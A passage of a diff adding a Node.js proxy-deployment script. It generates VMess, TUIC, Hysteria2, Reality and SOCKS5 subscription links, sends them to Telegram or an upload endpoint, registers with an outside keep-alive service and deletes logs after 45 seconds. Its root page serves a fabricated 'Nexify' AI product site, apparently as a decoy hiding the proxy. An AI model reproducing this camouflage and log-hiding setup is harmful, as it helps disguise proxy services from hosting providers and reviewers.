+    const vmessNode = `vmess://${Buffer.from(JSON.stringify({ v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'auto', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox' })).toString('base64')}`;
+    subTxt = vmessNode;
+  }
+
+  // TUIC
+  if (isValidPort(TUIC_PORT)) {
+    subTxt += `\ntuic://${UUID}:${UUID}@${SERVER_IP}:${TUIC_PORT}?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#${nodeName}`;
+  }
+
+  // Hysteria2
+  if (isValidPort(HY2_PORT)) {
+    subTxt += `\nhysteria2://${UUID}@${SERVER_IP}:${HY2_PORT}/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#${nodeName}`;
+  }
+
+  // Reality
+  if (isValidPort(REALITY_PORT)) {
+    subTxt += `\nvless://${UUID}@${SERVER_IP}:${REALITY_PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=${publicKey}&type=tcp&headerType=none#${nodeName}`;
+  }
+
+  // AnyTLS
+  if (isValidPort(ANYTLS_PORT)) {
+    subTxt += `\nanytls://${UUID}@${SERVER_IP}:${ANYTLS_PORT}?security=tls&sni=${SERVER_IP}&fp=chrome&insecure=1&allowInsecure=1#${nodeName}`;
+  }
+
+  // SOCKS5
+  if (isValidPort(S5_PORT)) {
+    const S5_AUTH = Buffer.from(`${UUID.substring(0, 8)}:${UUID.slice(-12)}`).toString('base64');
+    subTxt += `\nsocks://${S5_AUTH}@${SERVER_IP}:${S5_PORT}#${nodeName}`;
+  }
+
+  // 打印绿色 base64 编码
+  console.log('\x1b[32m' + Buffer.from(subTxt).toString('base64') + '\x1b[0m');
+  console.log('\x1b[35m' + 'Logs will be deleted in 45 seconds, you can copy the above nodes' + '\x1b[0m');
+
+  fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
+  fs.writeFileSync(listPath, subTxt, 'utf8');
+  console.log(`${FILE_PATH}/sub.txt saved successfully`);
+
+  return subTxt;
+}
+
+// ======================== Telegram 推送 ========================
+
+async function sendTelegram() {
+  if (!BOT_TOKEN || !CHAT_ID) {
+    console.log('TG variables is empty, Skipping push nodes to TG');
+    return;
+  }
+  try {
+    const message = fs.readFileSync(subPath, 'utf8');
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const escapedName = NAME.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
+    const params = {
+      chat_id: CHAT_ID,
+      text: `**${escapedName}节点推送通知**\n\`\`\`${message}\`\`\``,
+      parse_mode: 'MarkdownV2'
+    };
+    await axios.post(url, null, { params });
+    console.log('Telegram message sent successfully');
+  } catch (error) {
+    console.error('Failed to send Telegram message', error);
+  }
+}
+
+// ======================== 节点上传 ========================
+
+async function uploadNodes() {
+  if (UPLOAD_URL && PROJECT_URL) {
+    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
+    const jsonData = { subscription: [subscriptionUrl] };
+    try {
+      const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
+        headers: { 'Content-Type': 'application/json' }
+      });
+      if (response.status === 200) console.log('Subscription uploaded successfully');
+    } catch (error) { /* ignore */ }
+  } else if (UPLOAD_URL) {
+    if (!fs.existsSync(listPath)) return;
+    const content = fs.readFileSync(listPath, 'utf-8');
+    const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));
+    if (nodes.length === 0) return;
+    try {
+      const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`,
+        JSON.stringify({ nodes }),
+        { headers: { 'Content-Type': 'application/json' } }
+      );
+      if (response.status === 200) console.log('Subscription uploaded successfully');
+    } catch (error) { /* ignore */ }
+  }
+}
+
+// ======================== 自动保活 ========================
+
+async function addVisitTask() {
+  if (!AUTO_ACCESS || !PROJECT_URL) {
+    console.log('Skipping adding automatic access task');
+    return;
+  }
+  try {
+    await axios.post('https://keep.gvrander.eu.org/add-url', {
+      url: PROJECT_URL
+    }, { headers: { 'Content-Type': 'application/json' } });
+    console.log('Automatic access task added successfully');
+  } catch (error) {
+    console.error(`Add URL failed: ${error.message}`);
+  }
+}
+
+// ======================== HTTP 服务器 ========================
+
+function startHttpServer(subTxt) {
+  const server = http.createServer((req, res) => {
+    if (req.method !== 'GET') {
+      res.statusCode = 405;
+      res.end('Method Not Allowed');
+      return;
+    }
+    const url = new URL(req.url, `http://localhost`);
+    if (url.pathname === subscribePath) {
+      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+      const encodedContent = Buffer.from(subTxt).toString('base64');
+      res.end(encodedContent);
+    } else if (url.pathname === '/') {
+      res.setHeader('Content-Type', 'text/html; charset=utf-8');
+      res.end(`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexify | AI Automation Suite — No‑Code Intelligence</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            color: #1e1f2a;
+            background-color: #fefcff;
+        }
+
+        h1, h2, h3, h4, .logo-text, .plan-name, .nav-links a, .cta-button, .secondary-button {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Header & Navigation */
+        header {
+            background-color: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(8px);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04), 0 2px 8px rgba(0, 0, 0, 0.02);
+            position: fixed;
+            width: 100%;
+            z-index: 1000;
+            transition: all 0.2s;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 0;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            color: #8b5cf6;
+            font-size: 28px;
+            background: linear-gradient(135deg, #8b5cf6 0%, #c084fc 100%);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .logo-text {
+            font-size: 26px;
+            font-weight: 800;
+            color: #0f0e17;
+            letter-spacing: -0.3px;
+        }
+
+        .logo-text span {
+            background: linear-gradient(120deg, #8b5cf6, #c084fc);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: 36px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #3c3e4a;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: #8b5cf6;
+        }
+
+        .cta-button {
+            background: linear-gradient(105deg, #8b5cf6 0%, #a855f7 100%);
+            color: white;
+            border: none;
+            padding: 10px 26px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.25);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(139, 92, 246, 0.3);
+            background: linear-gradient(105deg, #7c3aed, #9333ea);
+        }
+
+        .secondary-button {
+            background-color: transparent;
+            color: #8b5cf6;
+            border: 1.5px solid #d9c9ff;
+            padding: 10px 26px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .secondary-button:hover {
+            background-color: #f5f0ff;
+            border-color: #8b5cf6;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 26px;
+            color: #1e1f2a;
+            cursor: pointer;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 160px 0 90px;
+            background: radial-gradient(ellipse 80% 50% at 20% 40%, #f3eaff, #ffffff);
+        }
+
+        .hero-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 48px;
+        }
+
+        .hero-text {
+            flex: 1;
+        }
+
+        .hero-text h1 {
+            font-size: 52px;
+            font-weight: 800;
+            line-height: 1.2;
+            letter-spacing: -0.02em;
+            margin-bottom: 24px;
+            color: #0f0e17;
+        }
+
+        .hero-text h1 span {
+            background: linear-gradient(135deg, #8b5cf6, #c241ff);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .hero-text p {
+            font-size: 1.2rem;
+            color: #4b4b5a;
+            margin-bottom: 36px;
+            max-width: 540px;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .hero-image {
+            flex: 1;
+            text-align: center;
+        }
+
+        .hero-image img {
+            max-width: 100%;
+            border-radius: 28px;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(139, 92, 246, 0.15);
+        }
+
+        /* Section titles */
+        .section-title {
+            text-align: center;
+            margin-bottom: 64px;
+        }
+
+        .section-title h2 {
+            font-size: 38px;
+            font-weight: 700;
+            color: #0f0e17;
+            letter-spacing: -0.01em;
+            margin-bottom: 16px;
+        }
+
+        .section-title p {
+            color: #5b5c6e;
+            max-width: 700px;
+            margin: 0 auto;
+            font-size: 1.1rem;
+        }
+
+        /* Features */
+        .features {
+            padding: 100px 0;
+            background-color: #ffffff;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+        }
+
+        .feature-card {
+            background: #fff;
+            padding: 32px 28px;
+            border-radius: 28px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.02), 0 2px 6px rgba(0, 0, 0, 0.03);
+            transition: all 0.3s ease;
+            border: 1px solid #f0eaff;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-8px);
+            border-color: #d9c9ff;
+            box-shadow: 0 20px 30px -12px rgba(139, 92, 246, 0.15);
+        }
+
+        .feature-icon {
+            background: #f2ecff;
+            color: #8b5cf6;
+            width: 64px;
+            height: 64px;
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            font-size: 28px;
+        }
+
+        .feature-card h3 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 14px;
+        }
+
+        .feature-card p {
+            color: #5a5b6e;
+            line-height: 1.5;
+        }
+
+        /* Benefits */
+        .benefits {
+            padding: 100px 0;
+            background-color: #fbfaff;
+        }
+
+        .benefits-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 40px;
+        }
+
+        .benefit-item {
+            text-align: center;
+            padding: 28px 20px;
+            background: white;
+            border-radius: 28px;
+            transition: all 0.2s;
+            border: 1px solid #f0ebff;
+        }
+
+        .benefit-icon {
+            color: #8b5cf6;
+            font-size: 44px;
+            margin-bottom: 20px;
+        }
+
+        .benefit-item h3 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .benefit-item p {
+            color: #5a5b6e;
+        }
+
+        /* Testimonials */
+        .testimonials {
+            padding: 100px 0;
+            background: white;
+        }
+
+        .testimonial-slider {
+            max-width: 850px;
+            margin: 0 auto;
+        }
+
+        .testimonial {
+            background: #fefbff;
+            padding: 48px 44px;
+            border-radius: 40px;
+            text-align: center;
+            box-shadow: 0 12px 28px -8px rgba(0, 0, 0, 0.05);
+            border: 1px solid #ede6ff;
+        }
+
+        .testimonial-text {
+            font-size: 1.28rem;
+            font-style: normal;
+            font-weight: 500;
+            margin-bottom: 32px;
+            color: #252641;
+            line-height: 1.45;
+        }
+
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .author-avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 100%;
+            background: linear-gradient(145deg, #e9deff, #d9c9ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: #6d28d9;
+        }
+
+        .author-info h4 {
+            font-size: 1.2rem;
+            margin-bottom: 4px;
+        }
+
+        .author-info p {
+            color: #6c6d80;
+            font-size: 0.85rem;
+        }
+
+        /* Pricing */
+        .pricing {
+            padding: 100px 0;
+            background: #fefaff;
+        }
+
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 32px;
+        }
+
+        .pricing-card {
+            background: white;
+            border-radius: 36px;
+            padding: 40px 28px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.03);
+            text-align: center;
+            transition: all 0.25s;
+            border: 1px solid #ede6ff;
+        }
+
+        .pricing-card.featured {
+            border-top: 6px solid #8b5cf6;
+            position: relative;
+            transform: scale(1.02);
+            box-shadow: 0 20px 35px -12px rgba(139, 92, 246, 0.2);
+        }
+
+        .featured-badge {
+            position: absolute;
+            top: -14px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #8b5cf6;
+            color: white;
+            padding: 6px 20px;
+            border-radius: 60px;
+            font-size: 0.8rem;
+            font-weight: 700;
+        }
+
+        .pricing-card:hover {
+            transform: translateY(-8px);
+        }
+
+        .pricing-card.featured:hover {
+            transform: scale(1.02) translateY(-8px);
+        }
+
+        .plan-name {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 18px;
+        }
+
+        .plan-price {
+            font-size: 3rem;
+            font-weight: 800;
+            color: #8b5cf6;
+            margin-bottom: 24px;
+        }
+
+        .plan-price span {
+            font-size: 1rem;
+            color: #7f7f92;
+            font-weight: 500;
+        }
+
+        .plan-features {
+            list-style: none;
+            margin-bottom: 32px;
+        }
+
+        .plan-features li {
+            padding: 12px 0;
+            border-bottom: 1px solid #f0eaff;
+            color: #454658;
+            font-weight: 500;
+        }
+
+        .plan-features li:last-child {
+            border-bottom: none;
+        }
+
+        /* CTA Section */
+        .cta-section {
+            padding: 100px 0;
+            background: linear-gradient(125deg, #1e1a3a 0%, #2b1e4e 100%);
+            text-align: center;
+            color: white;
+        }
+
+        .cta-section h2 {
+            font-size: 2.6rem;
+            margin-bottom: 20px;
+        }
+
+        .cta-section p {
+            font-size: 1.2rem;
+            max-width: 650px;
+            margin: 0 auto 32px;
+            opacity: 0.85;
+        }
+
+        .cta-section .cta-button {
+            background: white;
+            color: #6d28d9;
+            box-shadow: none;
+            font-size: 1rem;
+            padding: 14px 38px;
+        }
+
+        .cta-section .cta-button:hover {
+            background: #f5f0ff;
+            transform: translateY(-2px);
+        }
+
+        /* Footer */
+        footer {
+            background-color: #0c0b15;
+            color: #a8a9bc;
+            padding: 70px 0 24px;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 48px;
+            margin-bottom: 56px;
+        }
+
+        .footer-column h3 {
+            font-size: 1.2rem;
+            color: #eef2ff;
+            margin-bottom: 22px;
+            font-weight: 600;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: #b9bad2;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #c084fc;
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 28px;
+            border-top: 1px solid #24213a;
+            font-size: 0.85rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 992px) {
+            .hero-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            .hero-text p {
+                margin: 0 auto 30px;
+            }
+            .hero-buttons {
+                justify-content: center;
+            }
+            .pricing-card.featured {
+                transform: none;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            .mobile-menu-btn {
+                display: block;
+            }
+            .hero-text h1 {
+                font-size: 38px;
+            }
+            .section-title h2 {
+                font-size: 30px;
+            }
+            .testimonial {
+                padding: 32px 24px;
+            }
+            .testimonial-text {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 560px) {
+            .hero {
+                padding: 130px 0 70px;
+            }
+            .feature-card, .benefit-item, .pricing-card {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">
+                    <div class="logo-icon"><i class="fas fa-robot"></i></div>
+                    <div class="logo-text">Nex<span>ify</span></div>
+                </div>
+                <ul class="nav-links">
+                    <li><a href="#features">Capabilities</a></li>
+                    <li><a href="#benefits">Why Nexify</a></li>
+                    <li><a href="#testimonials">Stories</a></li>
+                    <li><a href="#pricing">Plans</a></li>
+                    <li><a href="#">Resources</a></li>
+                </ul>
+                <button class="cta-button">Try free →</button>
+                <button class="mobile-menu-btn"><i class="fas fa-bars"></i></button>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <div class="hero-text">
+                    <h1>Intelligent workflows, <span>built without limits</span></h1>
+                    <p>Nexify empowers teams to design, automate, and scale AI-native applications — no deep coding required. Connect models, data, and logic visually.</p>
+                    <div class="hero-buttons">
+                        <button class="cta-button">Start building free</button>
+                        <button class="secondary-button">Watch demo</button>
+                    </div>
+                </div>
+                <div class="hero-image">
+                    <img src="https://images.unsplash.com/photo-1581291518633-83b4ebd1d83e?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Nexify AI Dashboard concept">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="features" id="features">
+        <div class="container">
+            <div class="section-title">
+                <h2>Everything you need to build with AI</h2>
+                <p>From prototype to production, Nexify combines no‑code simplicity with professional flexibility.</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-cubes"></i></div>
+                    <h3>Visual AI Builder</h3>
+                    <p>Drag & drop pre‑trained models, prompt nodes, and logic gates. Build complex AI chains in minutes.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-database"></i></div>
+                    <h3>Unified Data Hub</h3>
+                    <p>Connect to databases, CRMs, or vector stores. Sync live data without writing SQL or API glue.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-cloud-upload-alt"></i></div>
+                    <h3>Deploy anywhere</h3>
+                    <p>One‑click cloud deployment or self‑hosted on your infrastructure. Auto‑scaling out of the box.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-brain"></i></div>
+                    <h3>LLM playground</h3>
+                    <p>Compare GPT-4o, Claude, Gemini, and open‑source models. Tune prompts without code.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-shield-hooded"></i></div>
+                    <h3>Enterprise security</h3>
+                    <p>SSO, RBAC, data encryption, and audit logs — ready for regulated industries.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-chalkboard-user"></i></div>
+                    <h3>Human-in-the-loop</h3>
+                    <p>Add approvals, reviews, and fallback logic to keep AI workflows reliable and safe.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="benefits" id="benefits">
+        <div class="container">
+            <div class="section-title">
+                <h2>Why forward‑thinking teams choose Nexify</h2>
+                <p>Accelerate AI adoption without sacrificing control or creativity.</p>
+            </div>
+            <div class="benefits-grid">
+                <div class="benefit-item">
+                    <div class="benefit-icon"><i class="fas fa-gauge-high"></i></div>
+                    <h3>5x faster delivery</h3>
+                    <p>Build AI features in days instead of sprints — from idea to working prototype.</p>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon"><i class="fas fa-coins"></i></div>
+                    <h3>Reduce costs by 65%</h3>
+                    <p>Cut infrastructure overhead and developer hours with visual tooling.</p>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon"><i class="fas fa-chalkboard"></i></div>
+                    <h3>Empower domain experts</h3>
+                    <p>Let product owners and analysts build intelligent automations safely.</p>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon"><i class="fas fa-arrow-trend-up"></i></div>
+                    <h3>Future‑proof scaling</h3>
+                    <p>From hackathon MVP to mission‑critical AI platform on the same stack.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="testimonials" id="testimonials">
+        <div class="container">
+            <div class="section-title">
+                <h2>Loved by AI pioneers & enterprises</h2>
+                <p>Join thousands of builders who ship faster with Nexify.</p>
+            </div>
+            <div class="testimonial-slider">
+                <div class="testimonial">
+                    <div class="testimonial-text">“Nexify turned our AI pilots into production‑ready systems within 6 weeks. The visual workflow builder made collaboration between ML engineers and product teams seamless.”</div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">DR</div>
+                        <div class="author-info">
+                            <h4>Dr. Elena Rossi</h4>
+                            <p>Head of AI, Vectra Health</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="pricing" id="pricing">
+        <div class="container">
+            <div class="section-title">
+                <h2>Simple plans, limitless potential</h2>
+                <p>Start free, upgrade when you grow. All plans include core AI building blocks.</p>
+            </div>
+            <div class="pricing-grid">
+                <div class="pricing-card">
+                    <h3 class="plan-name">Starter</h3>
+                    <div class="plan-price">$39<span>/month</span></div>
+                    <ul class="plan-features">
+                        <li>Up to 5 team members</li>
+                        <li>20 GB vector storage</li>
+                        <li>Pre‑built AI components</li>
+                        <li>Community support</li>
+                        <li>2 production apps</li>
+                    </ul>
+                    <button class="secondary-button">Start free trial</button>
+                </div>
+                <div class="pricing-card featured">
+                    <div class="featured-badge">🔥 Most popular</div>
+                    <h3 class="plan-name">Pro</h3>
+                    <div class="plan-price">$99<span>/month</span></div>
+                    <ul class="plan-features">
+                        <li>Up to 20 members</li>
+                        <li>200 GB + vector DB</li>
+                        <li>All LLM models & fine‑tuning</li>
+                        <li>Priority chat support</li>
+                        <li>Unlimited apps + API access</li>
+                        <li>Custom prompt libraries</li>
+                    </ul>
+                    <button class="cta-button">Try 14 days free</button>
+                </div>
+                <div class="pricing-card">
+                    <h3 class="plan-name">Enterprise</h3>
+                    <div class="plan-price">Custom</div>
+                    <ul class="plan-features">
+                        <li>Unlimited seats</li>
+                        <li>Unlimited storage & throughput</li>
+                        <li>SLA 99.9% uptime</li>
+                        <li>24/7 dedicated support</li>
+                        <li>On‑prem / VPC deployment</li>
+                        <li>Custom AI model hosting</li>
+                    </ul>
+                    <button class="secondary-button">Contact sales</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="cta-section">
+        <div class="container">
+            <h2>Launch your first AI agent today</h2>
+            <p>No credit card required. Build, test, and deploy intelligent workflows in minutes — not months.</p>
+            <button class="cta-button">Get started for free →</button>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <div class="logo">
+                        <div class="logo-icon"><i class="fas fa-robot"></i></div>
+                        <div class="logo-text">Nex<span>ify</span></div>
+                    </div>
+                    <p style="margin-top: 20px; color: #b9bad2;">The modern AI automation suite built for business & engineering teams.</p>
+                </div>
+                <div class="footer-column">
+                    <h3>Platform</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Features</a></li>
+                        <li><a href="#">Integrations</a></li>
+                        <li><a href="#">AI models</a></li>
+                        <li><a href="#">Security</a></li>
+                        <li><a href="#">Roadmap</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Resources</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Documentation</a></li>
+                        <li><a href="#">Guides & tutorials</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Community</a></li>
+                        <li><a href="#">API reference</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Company</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">About Nexify</a></li>
+                        <li><a href="#">Careers</a></li>
+                        <li><a href="#">Press</a></li>
+                        <li><a href="#">Privacy & terms</a></li>
+                        <li><a href="#">Contact</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="copyright">
+                <p>&copy; 2025 Nexify. All rights reserved. Intelligent automation for everyone.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        (function(){
+            // Mobile menu toggle
+            const mobileBtn = document.querySelector('.mobile-menu-btn');
+            const navLinks = document.querySelector('.nav-links');
+            
+            if(mobileBtn) {
+                mobileBtn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    if(navLinks.style.display === 'flex') {
+                        navLinks.style.display = 'none';
+                    } else {
+                        navLinks.style.display = 'flex';
+                        if(window.innerWidth <= 768) {
+                            navLinks.style.flexDirection = 'column';
+                            navLinks.style.position = 'absolute';
+                            navLinks.style.top = '80px';
+                            navLinks.style.left = '0';
+                            navLinks.style.width = '100%';
+                            navLinks.style.backgroundColor = '#ffffff';
+                            navLinks.style.padding = '28px 24px';
+                            navLinks.style.boxShadow = '0 20px 30px rgba(0,0,0,0.08)';
+                            navLinks.style.gap = '24px';
+                            navLinks.style.borderBottom = '1px solid #ede6ff';
+                            const listItems = document.querySelectorAll('.nav-links li');
+                            listItems.forEach(li => li.style.margin = '0');
+                        }
+                    }
+                });
+            }
+            
+            // Smooth scroll + close mobile menu on anchor click
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    const targetId = this.getAttribute('href');
+                    if(targetId === '#') return;
+                    const target = document.querySelector(targetId);
+                    if(target) {
+                        e.preventDefault();
+                        window.scrollTo({
+                            top: target.offsetTop - 80,
+                            behavior: 'smooth'
+                        });
+                        if(window.innerWidth <= 768 && navLinks) {
+                            navLinks.style.display = 'none';
+                        }
+                    }
+                });
+            });
+            
+            // Testimonial carousel (rotating content)
+            const testimonialData = [
+                { text: "Nexify turned our AI pilots into production\\u2011ready systems within 6 weeks. The visual workflow builder made collaboration between ML engineers and product teams seamless.", name: "Dr. Elena Rossi", position: "Head of AI, Vectra Health", initials: "ER" },
+                { text: "We automated 80% of customer support queries using Nexify\\u2019s LLM pipelines. The no\\u2011code connectors saved months of backend work. Absolute game changer.", name: "Marcus Velez", position: "VP of Product, Supportly", initials: "MV" },
+                { text: "As a creative agency, we now prototype AI features in days instead of months. Nexify gives us the freedom to experiment and scale instantly.", name: "Sofia Nakamura", position: "Creative Director, Naked Studio", initials: "SN" }
+            ];
+            
+            let currentIdx = 0;
+            const testimonialContainer = document.querySelector('.testimonial');
+            
+            function updateTestimonial() {
+                if(!testimonialContainer) return;
+                const t = testimonialData[currentIdx];
+                // 使用字符串拼接代替模板字符串，避免与外层Node.js模板字符串冲突
+                testimonialContainer.innerHTML = '' +
+                    '<div class="testimonial-text">"' + t.text + '"</div>' +
+                    '<div class="testimonial-author">' +
+                        '<div class="author-avatar">' + t.initials + '</div>' +
+                        '<div class="author-info">' +
+                            '<h4>' + t.name + '</h4>' +
+                            '<p>' + t.position + '</p>' +
+                        '</div>' +
+                    '</div>';
+            }
+            
+            if(testimonialContainer && testimonialData.length) {
+                updateTestimonial();
+                setInterval(() => {
+                    currentIdx = (currentIdx + 1) % testimonialData.length;
+                    updateTestimonial();
+                }, 5200);
+            }
+            
+            // CTA button alerts (demo interactions)
+            const allCtaBtns = document.querySelectorAll('.cta-button');
+            const secondaryBtns = document.querySelectorAll('.secondary-button');
+            
+            allCtaBtns.forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    if(btn.closest('.cta-section') && btn.innerText.includes('Get started')) {
+                        alert("✨ Welcome to Nexify! You would be redirected to the sign-up page in a live version. Start building with AI.");
+                    } else if(btn.innerText.includes('Try free') || btn.innerText.includes('Start building free')) {
+                        alert("🚀 Nexify free trial — instant access to visual AI builder. No credit card required.");
+                    } else {
+                        alert("⚡ Nexify: Supercharge your workflows. Reach out to our team anytime.");
+                    }
+                });
+            });
+            
+            secondaryBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    if(btn.innerText.includes('Watch demo')) {
+                        alert("🎥 Nexify demo: see how to build an AI agent in 3 minutes (full walkthrough available).");
+                    } else if(btn.innerText.includes('Start free trial') || btn.innerText.includes('Contact sales')) {
+                        alert("📞 Our team will reach out shortly. Meanwhile explore our free tier.");
+                    } else {
+                        alert("💡 More info about Nexify plans — check our docs or talk to sales.");
+                    }
+                });
+            });
+            
+            // close mobile menu on resize if needed
+            window.addEventListener('resize', function() {
+                if(window.innerWidth > 768 && navLinks) {
+                    navLinks.style.display = '';
+                    navLinks.style.removeProperty('flex-direction');
+                    navLinks.style.removeProperty('position');
+                    navLinks.style.removeProperty('top');
+                    navLinks.style.removeProperty('width');
+                    navLinks.style.removeProperty('padding');
+                    navLinks.style.removeProperty('box-shadow');
+                } else if(window.innerWidth <= 768 && navLinks.style.display === 'flex') {
+                    navLinks.style.display = 'flex';
+                    navLinks.style.flexDirection = 'column';
+                    navLinks.style.position = 'absolute';
+                    navLinks.style.top = '80px';
+                    navLinks.style.left = '0';
+                    navLinks.style.width = '100%';
+                    navLinks.style.backgroundColor = '#ffffff';
+                    navLinks.style.padding = '28px 24px';
+                    navLinks.style.boxShadow = '0 20px 30px rgba(0,0,0,0.08)';
+                }
+            });
+        })();
+    </script>
+</body>
+</html>`);
+    } else {
+      res.statusCode = 404;
+      res.end('Not Found');
+    }
+  });
+
+  function tryListen(port, retries) {
